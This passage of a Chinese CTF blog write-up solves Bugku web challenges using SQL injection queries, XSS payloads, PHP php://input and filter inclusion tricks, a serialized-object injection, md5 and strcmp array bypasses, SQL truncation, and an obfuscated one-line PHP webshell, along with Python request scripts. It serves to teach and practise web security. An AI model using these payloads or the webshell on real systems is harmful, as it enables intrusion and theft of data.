<h3 id="0x18-备份是个好习惯"><a href="#0x18-备份是个好习惯" class="headerlink" title="0x18 备份是个好习惯"></a>0x18 备份是个好习惯</h3><p>原理:源码泄漏 <br><br>用这个工具即可<br><a href="https://coding.net/u/yihangwang/p/SourceLeakHacker/git?public=true" target="_blank" rel="noopener">https://coding.net/u/yihangwang/p/SourceLeakHacker/git?public=true</a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">/**</span><br><span class="line"> * Created by PhpStorm.</span><br><span class="line"> * User: Norse</span><br><span class="line"> * Date: 2017/8/6</span><br><span class="line"> * Time: 20:22</span><br><span class="line">*/</span><br><span class="line"></span><br><span class="line">include_once &quot;flag.php&quot;;</span><br><span class="line">ini_set(&quot;display_errors&quot;, 0);</span><br><span class="line">$str = strstr($_SERVER[&apos;REQUEST_URI&apos;], &apos;?&apos;);</span><br><span class="line">$str = substr($str,1);</span><br><span class="line">$str = str_replace(&apos;key&apos;,&apos;&apos;,$str);</span><br><span class="line">parse_str($str);</span><br><span class="line">echo md5($key1);</span><br><span class="line">echo md5($key2);</span><br><span class="line">if(md5($key1) == md5($key2) &amp;&amp; $key1 !== $key2)&#123;</span><br><span class="line">    echo $flag.&quot;取得flag&quot;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">分析源码:11行strstr获得URI从&apos;?&apos;往后(包括&apos;?&apos;)的字符串,</span><br><span class="line">12行去掉&apos;?&apos;，13行把字符串中的&apos;key&apos;替换为空.</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">构造payload:?kkeyey1=QNKCDZO&amp;kkeyey2=240610708</span><br></pre></td></tr></table></figure>
<h3 id="0x19-成绩单"><a href="#0x19-成绩单" class="headerlink" title="0x19 成绩单"></a>0x19 成绩单</h3><p>爆出所有的数据库名</p>
<p><img src="http://p1vrkwaxt.bkt.clouddn.com/%7D@Q~%5BAH4Y3EBNO94_P%25O%287D.png" alt="image"><br>得到库名skctf_flag<br><br>爆出所有的表名</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=0&apos; union select 1,2,3,group_concat(table_name) from information_schema.tables where table_schema=database()#</span><br></pre></td></tr></table></figure>
<p>得到表名:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fl4g</span><br></pre></td></tr></table></figure></p>
<p>爆出该表名下的所有字段(十六进制绕过)</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=0&apos; union select 1,2,3,group_concat(column_name) from information_schema.columns where table_name=0x666c3467#</span><br></pre></td></tr></table></figure>
<p>得到字段名:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">skctf_flag</span><br></pre></td></tr></table></figure></p>
<p>最后爆出该库名该表名该字段下的内容<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=0&apos; union select 1,2,3,skctf_flag from skctf_flag.fl4g#</span><br></pre></td></tr></table></figure></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">BUGKU&#123;Sql_INJECT0N_4813drd8hz4&#125;</span><br></pre></td></tr></table></figure>
<h3 id="0x20-秋名山老司机"><a href="#0x20-秋名山老司机" class="headerlink" title="0x20 秋名山老司机"></a>0x20 秋名山老司机</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">亲请在2s内计算老司机的车速是多少</span><br><span class="line"></span><br><span class="line">1921304812-974550581-1618896679+941800639*1148083668-2040820160*2001976067+1660996094*992863445+1871736601-1071212364=?;</span><br></pre></td></tr></table></figure>
<p>很明显地要想在2s内完成就得靠脚本爆破</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import re</span><br><span class="line">url = &apos;http://120.24.86.145:8002/qiumingshan/&apos;</span><br><span class="line">s = requests.Session()</span><br><span class="line">source = s.get(url)</span><br><span class="line">expression = re.search(r&apos;(\d+[+\-*])+(\d+)&apos;, source.text).group()</span><br><span class="line">result = eval(expression)</span><br><span class="line">post = &#123;&apos;value&apos;: result&#125;</span><br><span class="line">print(s.post(url, data = post).text)</span><br></pre></td></tr></table></figure>
<ul>
<li>必须利用会话对象 Session()，否则提交结果的时候，页面又重新生成一个新的表达式，结果自然错误</li>
<li>利用正则表达式截取响应内容中的算术表达式。首先引入 re 模块，其次用 search() 匹配算术表达式，匹配成功后用 group() 返回算术表达式的字符串</li>
</ul>
<h3 id="0x21-速度要快"><a href="#0x21-速度要快" class="headerlink" title="0x21 速度要快"></a>0x21 速度要快</h3><p>与上面原理相同，写个脚本<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import base64</span><br><span class="line"></span><br><span class="line">s = requests.Session()</span><br><span class="line">url = &apos;http://120.24.86.145:8002/web6/&apos;</span><br><span class="line">headers = s.get(url).headers</span><br><span class="line">m = base64.b64decode(base64.b64decode(headers[&apos;flag&apos;]).split(&apos;:&apos;)[1])</span><br><span class="line">data  = &#123;&apos;margin&apos;:m&#125;</span><br><span class="line">print(s.post(url,data=data).text)</span><br></pre></td></tr></table></figure></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">KEY&#123;111dd62fcd377076be18a&#125;</span><br></pre></td></tr></table></figure>
<h3 id="0x22-cookie欺骗"><a href="#0x22-cookie欺骗" class="headerlink" title="0x22 cookie欺骗"></a>0x22 cookie欺骗</h3><p>url上的参数明显是base64码，解码后为key.txt<br><br>把参数换成index.php后编码，观察发现line按行返回<br><br>写个脚本跑一下<br><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">s= requests.Session()</span><br><span class="line">result = &quot;&quot;</span><br><span class="line">url = &apos;http://120.24.86.145:8002/web11/index.php?line=%d&amp;filename=aW5kZXgucGhw&apos;</span><br><span class="line">for i in range(1,30):</span><br><span class="line">        content = s.get(url%i).text</span><br><span class="line">        if content == &quot;&quot;:</span><br><span class="line">                break</span><br><span class="line">        result += content</span><br><span class="line">print result</span><br></pre></td></tr></table></figure></p>
<p>也可以这么写脚本，练了一下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">s= requests.Session()</span><br><span class="line">result = &quot;&quot;</span><br><span class="line">url = &apos;http://120.24.86.145:8002/web11/index.php&apos;</span><br><span class="line">for i in range(1,30):</span><br><span class="line">        payload = &#123;&apos;line&apos;:str(i),&apos;filename&apos;:&apos;aW5kZXgucGhw&apos;&#125;</span><br><span class="line">        m = s.get(url,params=payload)</span><br><span class="line">        result += m.text</span><br><span class="line">print result</span><br></pre></td></tr></table></figure></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">error_reporting(0);</span><br><span class="line">$file=base64_decode(isset($_GET[&apos;filename&apos;])?$_GET[&apos;filename&apos;]:&quot;&quot;);</span><br><span class="line">$line=isset($_GET[&apos;line&apos;])?intval($_GET[&apos;line&apos;]):0;</span><br><span class="line">if($file==&apos;&apos;) header(&quot;location:index.php?line=&amp;filename=a2V5cy50eHQ=&quot;);</span><br><span class="line">$file_list = array(</span><br><span class="line">&apos;0&apos; =&gt;&apos;keys.txt&apos;,</span><br><span class="line">&apos;1&apos; =&gt;&apos;index.php&apos;,</span><br><span class="line">);</span><br><span class="line"> </span><br><span class="line">if(isset($_COOKIE[&apos;margin&apos;]) &amp;&amp; $_COOKIE[&apos;margin&apos;]==&apos;margin&apos;)&#123;</span><br><span class="line">$file_list[2]=&apos;keys.php&apos;;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">if(in_array($file, $file_list))&#123;</span><br><span class="line">$fa = file($file);</span><br><span class="line">echo $fa[$line];</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>说明要求在keys.php下构造Cookie:margin=margin</p>
<ul>
<li>可以用burpsuite抓取传递Cookie</li>
<li>也可以写个脚本传递过去，如下:<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">s= requests.Session()</span><br><span class="line">result = &quot;&quot;</span><br><span class="line">url =&apos;http://120.24.86.145:8002/web11/index.php?line=0%d&amp;filename=a2V5cy5waHA=&apos;</span><br><span class="line">cookies = &#123;&apos;margin&apos;:&apos;margin&apos;&#125;</span><br><span class="line">result = s.get(url,cookies=cookies).text</span><br><span class="line">print result</span><br></pre></td></tr></table></figure>
</li>
</ul>
<p>跑出如下:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php $key=&apos;KEY&#123;key_keys&#125;&apos;; ?&gt;</span><br></pre></td></tr></table></figure></p>
<h3 id="0x23-xss"><a href="#0x23-xss" class="headerlink" title="0x23 xss"></a>0x23 xss</h3><p><img src="http://p1vrkwaxt.bkt.clouddn.com/1R_M%28G@_M69%25N%5D@%5BG%60_N%2525.png" alt="image"></p>
<p>构造payload:<br><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://103.238.227.13:10089/?id=&lt;img src=1 onerror=alert(_key_)&gt;</span><br></pre></td></tr></table></figure></p>
<p>查看源代码发现&lt;&gt;这被过滤掉了，这里有一篇文章<br><br><a href="http://www.360doc.com/content/16/0308/12/2340477_540447147.shtml" target="_blank" rel="noopener">绕过xss过滤方法</a></p>
<p>所以用尝试构造payload如下:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://103.238.227.13:10089/?id=\u003cimg src=1 onerror=alert(_key_)\u003e</span><br></pre></td></tr></table></figure></p>
<p>得到flag</p>
<h3 id="0x23-never-give-up"><a href="#0x23-never-give-up" class="headerlink" title="0x23 never give up"></a>0x23 never give up</h3><p>点开后什么也没有,查看源代码发现 1p.html,复制到url发现莫名跳到<a href="http://www.bugku.com了,猜想里面用了header" target="_blank" rel="noopener">www.bugku.com了,猜想里面用了header</a> location,即:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">header(&apos;Location: http://www.bugku.com/&apos;)</span><br></pre></td></tr></table></figure></p>
<p>于是上burpsuite抓包如图:<br><img src="http://p1vrkwaxt.bkt.clouddn.com/LC2P5AV4XG%28%285S04CW%60CT7D.png" alt="image"></p>
<p>发现var后面有可解码字符,首先url解码，再base64解码，最后url解码得到:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&quot;if(!$_GET[&apos;id&apos;])</span><br><span class="line">&#123;</span><br><span class="line">	header(&apos;Location: hello.php?id=1&apos;);</span><br><span class="line">	exit();</span><br><span class="line">&#125;</span><br><span class="line">$id=$_GET[&apos;id&apos;];</span><br><span class="line">$a=$_GET[&apos;a&apos;];</span><br><span class="line">$b=$_GET[&apos;b&apos;];</span><br><span class="line">if(stripos($a,&apos;.&apos;))</span><br><span class="line">&#123;</span><br><span class="line">	echo &apos;no no no no no no no&apos;;</span><br><span class="line">	return ;</span><br><span class="line">&#125;</span><br><span class="line">$data = @file_get_contents($a,&apos;r&apos;);</span><br><span class="line">if($data==&quot;bugku is a nice plateform!&quot; and $id==0 and strlen($b)&gt;5 and eregi(&quot;111&quot;.substr($b,0,1),&quot;1114&quot;) and substr($b,0,1)!=4)</span><br><span class="line">&#123;</span><br><span class="line">	require(&quot;f4l2a3g.txt&quot;);</span><br><span class="line">&#125;</span><br><span class="line">else</span><br><span class="line">&#123;</span><br><span class="line">	print &quot;never never never give up !!!&quot;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<ul>
<li>$data==”bugku is a nice plateform!”：可以令a=php://input，然后POST传值 bugku is a nice plateform! 绕过。</li>
<li>strlen($b)&gt;5 and eregi(“111”.substr($b,0,1),”1114”) and substr($b,0,1)!=4：可以利用%00截断，令b=%0012345 绕过。</li>
<li>!$_GET[‘id’]并且id==0：令id=%00或者令id=.都可以绕过<br><img src="http://p1vrkwaxt.bkt.clouddn.com/13.png" alt="image"></li>
</ul>
<h3 id="0x24-welcome-to-bugkuctf"><a href="#0x24-welcome-to-bugkuctf" class="headerlink" title="0x24 welcome to bugkuctf"></a>0x24 welcome to bugkuctf</h3><p>查看源代码得到:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--    </span><br><span class="line">$user = $_GET[&quot;txt&quot;];    </span><br><span class="line">$file = $_GET[&quot;file&quot;];    </span><br><span class="line">$pass = $_GET[&quot;password&quot;];    </span><br><span class="line">    </span><br><span class="line">if(isset($user)&amp;&amp;(file_get_contents($user,&apos;r&apos;)===&quot;welcome to the bugkuctf&quot;))&#123;    </span><br><span class="line">    echo &quot;hello admin!&lt;br&gt;&quot;;    </span><br><span class="line">    include($file); //hint.php    </span><br><span class="line">&#125;else&#123;    </span><br><span class="line">    echo &quot;you are not admin ! &quot;;    </span><br><span class="line">&#125;    </span><br><span class="line"> --&gt;</span><br></pre></td></tr></table></figure></p>
<p>这里user跟上一题类似</p>
<ul>
<li>读取$user文件，内容为welcome to the bugkuctf，</li>
<li>$file要求为hint.php，将其导入<br>这两个分别利用php://input与php://filter<br><br>构造url如下:(看图)<br><img src="http://p1vrkwaxt.bkt.clouddn.com/~KVH$A%5BP%5BT@%29QR%5DIW8B%5D8%7DB.png" alt="image"><br>hint.php经过base64解码后如下:<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php  </span><br><span class="line">  </span><br><span class="line">class Flag&#123;//flag.php  </span><br><span class="line">    public $file;  </span><br><span class="line">    public function __tostring()&#123;  </span><br><span class="line">        if(isset($this-&gt;file))&#123;  </span><br><span class="line">            echo file_get_contents($this-&gt;file); </span><br><span class="line">			echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">		return (&quot;good&quot;);</span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
</li>
</ul>
<p>仔细一看没太大有用信息，便尝试读取index.php源码，方法同上<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php  </span><br><span class="line">$txt = $_GET[&quot;txt&quot;];  </span><br><span class="line">$file = $_GET[&quot;file&quot;];  </span><br><span class="line">$password = $_GET[&quot;password&quot;];  </span><br><span class="line">  </span><br><span class="line">if(isset($txt)&amp;&amp;(file_get_contents($txt,&apos;r&apos;)===&quot;welcome to the bugkuctf&quot;))&#123;  </span><br><span class="line">    echo &quot;hello friend!&lt;br&gt;&quot;;  </span><br><span class="line">    if(preg_match(&quot;/flag/&quot;,$file))&#123; </span><br><span class="line">		echo &quot;不能现在就给你flag哦&quot;;</span><br><span class="line">        exit();  </span><br><span class="line">    &#125;else&#123;  </span><br><span class="line">        include($file);   </span><br><span class="line">        $password = unserialize($password);  </span><br><span class="line">        echo $password;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;else&#123;  </span><br><span class="line">    echo &quot;you are not the number of bugku ! &quot;;  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
<p>从上面获取的源码可得到如下信息：</p>
<p>1.提示hint.php中提示flag.php,从index.php可以看到对关键词flag进行了屏蔽</p>
<p>2.hint.php中定义了一个类Flag，很有意思的是中间有个 __tostring 方法，这个方法可以理解为将这个类作为字符串执行时会自动执行的一个函数</p>
<p>3.__tostring 方法执行时，将变量$file作为文件名输出文件内容，结合提示flag.php，猜测屏蔽的flag.php文件在此打开</p>
<p>4.在index.php源码中看到了$password的作用</p>
<p>之前说过Flag方法当做字符串执行时，会自动执行 __tostring 方法，注意到echo函数，只能输出一个或多个字符串，所以只要$password为Flag类型数据，且其中string类型的变量$file为flag.php即可</p>
<p>理解到这里，就懂了为啥多一个很奇怪的unserialize函数，其作用即为让你用字符串方式传递一个类<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php  </span><br><span class="line">    class Flag&#123;//flag.php    </span><br><span class="line">    public $file;    </span><br><span class="line">    &#125;    </span><br><span class="line">  </span><br><span class="line">    $a = new Flag();  </span><br><span class="line">    $a-&gt;file = &quot;flag.php&quot;;  </span><br><span class="line">    $a = serialize($a);  </span><br><span class="line">    print_r($a);  </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
<p>得到如下:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:4:&quot;Flag&quot;:1:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;&#125;</span><br></pre></td></tr></table></figure>
<p>最后构造的payload:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://120.24.86.145:8006/test1/index.php?txt=php://input&amp;flie=hint.php&amp;password=O:4:&quot;Flag&quot;:1:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;&#125;</span><br></pre></td></tr></table></figure></p>
<p>post输出welcome to the bugkuctf</p>
<p>查看源代码得到flag</p>
<h3 id="0x25-过狗一句话"><a href="#0x25-过狗一句话" class="headerlink" title="0x25 过狗一句话"></a>0x25 过狗一句话</h3><p><img src="http://p1vrkwaxt.bkt.clouddn.com/%5B_%5BFSF8@9%5DRF10%7BIBJ8T~%602.png" alt="image"><br>整理一下代码得到:<br><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$poc=&quot;a#s#s#e#r#t&quot;;</span><br><span class="line">$poc_1=explode(&quot;#&quot;,$poc);</span><br><span class="line">$poc_2=$poc_1[0].$poc_1[1].$poc_1[2].$poc_1[3].$poc_1[4].$poc_1[5];</span><br><span class="line">$poc_2($_GET[&apos;s&apos;])</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
<p>仔细研读一下代码，可以发现它这个最终是一句话木马，格式如下:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php assert($_GET[&apos;s&apos;]) ?&gt;</span><br></pre></td></tr></table></figure></p>
<p>它这个为什么要弄这么复杂呢，百度查了下过狗一句话原理<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">为了不让狗(安全玩家)看出来这是一句话木马，在一句话木马上增加修饰</span><br></pre></td></tr></table></figure></p>
<p>接下来是正解:<br><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?s=print_r(scandir(&apos;./&apos;))</span><br></pre></td></tr></table></figure></p>
<p>可以看到<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Array ( [0] =&gt; . [1] =&gt; .. [2] =&gt; 2.php [3] =&gt; 3.php [4] =&gt; 4.php [5] =&gt; 5.php [6] =&gt; NewFile.txt [7] =&gt; a.php [8] =&gt; a.txt [9] =&gt; c.php [10] =&gt; conn [11] =&gt; f.html [12] =&gt; f.php [13] =&gt; flag.txt [14] =&gt; h.php [15] =&gt; haha.php [16] =&gt; index.php [17] =&gt; ll.php [18] =&gt; oudeniu.php [19] =&gt; q.php [20] =&gt; shell.php [21] =&gt; t2.php [22] =&gt; testfile.txt [23] =&gt; txxxc.php [24] =&gt; x.php [25] =&gt; zx.php )</span><br></pre></td></tr></table></figure></p>
<p>尝试读取flag.txt得到flag</p>
<ul>
<li>scandir 列出./目录中的文件和目录：</li>
<li>print echo 只能输出字符串<h3 id="0x26-字符？正则？"><a href="#0x26-字符？正则？" class="headerlink" title="0x26 字符？正则？"></a>0x26 字符？正则？</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">highlight_file(&apos;2.php&apos;);</span><br><span class="line">$key=&apos;KEY&#123;********************************&#125;&apos;;</span><br><span class="line">$IM= preg_match(&quot;/key.*key.&#123;4,7&#125;key:\/.\/(.*key)[a-z][[:punct:]]/i&quot;, trim($_GET[&quot;id&quot;]), $match);</span><br><span class="line">if( $IM )&#123; </span><br><span class="line">  die(&apos;key is: &apos;.$key);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
</li>
</ul>
<p>很明显的是正则表达式的绕过,这里简单解释下:</p>
<ul>
<li>1.表达式直接写出来的字符串直接利用，如key</li>
<li>2.“.”代表任意字符</li>
<li>3.“*”代表一个或一序列字符重复出现的次数，即前一个字符重复任意次</li>
<li>4.“\/”代表“/”</li>
<li>5.[a-z]代表a-z中的任意一个字符</li>
<li>6.[[:punct:]]代表任意一个字符，包括各种符号</li>
<li>7./i代表大小写不敏感</li>
<li>8.{4-7}代表[0-9]中数字连续出现的次数是4-7次</li>
<li>9.移除字符串两侧的字符,具体格式自行百度<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://120.24.86.145:8002/web10/?id=keymkeyk555555key:/s/mkeyb@a</span><br></pre></td></tr></table></figure>
</li>
</ul>
<p>得到flag</p>
<h3 id="0x27-前女友-SKCTF"><a href="#0x27-前女友-SKCTF" class="headerlink" title="0x27 前女友(SKCTF)"></a>0x27 前女友(SKCTF)</h3><p>查看源代码点链接看到源代码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if(isset($_GET[&apos;v1&apos;]) &amp;&amp; isset($_GET[&apos;v2&apos;]) &amp;&amp; isset($_GET[&apos;v3&apos;]))&#123;</span><br><span class="line">    $v1 = $_GET[&apos;v1&apos;];</span><br><span class="line">    $v2 = $_GET[&apos;v2&apos;];</span><br><span class="line">    $v3 = $_GET[&apos;v3&apos;];</span><br><span class="line">    if($v1 != $v2 &amp;&amp; md5($v1) == md5($v2))&#123;</span><br><span class="line">        if(!strcmp($v3, $flag))&#123;</span><br><span class="line">            echo $flag;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
<p>这里主要利用两个漏洞</p>
<ul>
<li>md5()函数漏洞</li>
<li>strcmp()函数漏洞<br>这两个都无法识别数组从而返回0<br><br>最终构造payload:<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://118.89.219.210:49162/?v1[]=1&amp;v2[]=2&amp;v3[]=1</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h3 id="0x28-login1-SKCTF"><a href="#0x28-login1-SKCTF" class="headerlink" title="0x28 login1(SKCTF)"></a>0x28 login1(SKCTF)</h3><p>原理:SQL约束攻击<br><br>这个不解释了，具体内容我博客有，也可以自行百度<br></p>
<ul>
<li>首先注册admin发现admin已经存在了，猜测是对admin进行SQL约束攻击<br>用户名注册为如下:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin                                                                                              1</span><br></pre></td></tr></table></figure>
</li>
</ul>
<p>空格符尽量多一点，因为mysql数据库当数据在超过一定长度的时候会自动截断。<br><br>密码随意.<br><br>发现注册成功，然后再登陆得到flag.</p>
<h3 id="0x29-你从哪里来"><a href="#0x29-你从哪里来" class="headerlink" title="0x29 你从哪里来"></a>0x29 你从哪里来</h3><p>原理:referer消息头<br><br>HTTP Referer是header的一部分，当浏览器向web服务器发送请求的时候，一般会带上Referer，告诉服务器我是从哪个页面链接过来的，服务器基此可以获得一些信息用于处理。<br><br>按F12或者抓包增加一条信息:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Referer:https://www.google.com</span><br></pre></td></tr></table></figure></p>
<p>得到flag</p>
<h3 id="0x30-md5-collision-NUPT-CTF"><a href="#0x30-md5-collision-NUPT-CTF" class="headerlink" title="0x30 md5 collision(NUPT_CTF)"></a>0x30 md5 collision(NUPT_CTF)</h3><p>原理:md5碰撞<br><br>百度的一个简单解释是:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">md5简单说是文件的指纹识别； 不同文件的md5码是不一样的；也有人研究这个算法的，找到两个不同文件但是md5一样的，这就是md5碰撞，几率很小。这是个不可逆算法</span><br></pre></td></tr></table></figure></p>
